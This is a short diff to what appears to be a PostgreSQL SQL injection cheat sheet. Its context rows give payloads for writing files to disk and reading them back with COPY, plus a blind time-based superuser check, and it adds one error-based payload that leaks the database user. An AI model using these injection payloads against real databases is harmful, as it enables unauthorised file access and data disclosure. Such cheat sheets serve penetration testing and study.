@@ -37,3 +37,4 @@
 |Write arbitary data to disc | CREATE TEMP TABLE TEST(data text);INSERT INTO TEST(data) VALUES ($$test$$);COPY TEST(data) TO $$C:\Program Files (x86)\PostgreSQL\9.2\data\test.txt$$ | 
 |Read data from file| CREATE TEMP TABLE TEST(data text); COPY TEST from $$C:\Program Files (x86)\PostgreSQL\9.2\data\test.txt$$; |
 |Blind CASE query example| SELECT case when (SELECT current_setting($$is_superuser$$))=$$on$$ then pg_sleep(5) end; |
+|Error based payloads|(select 1 from box(user))|
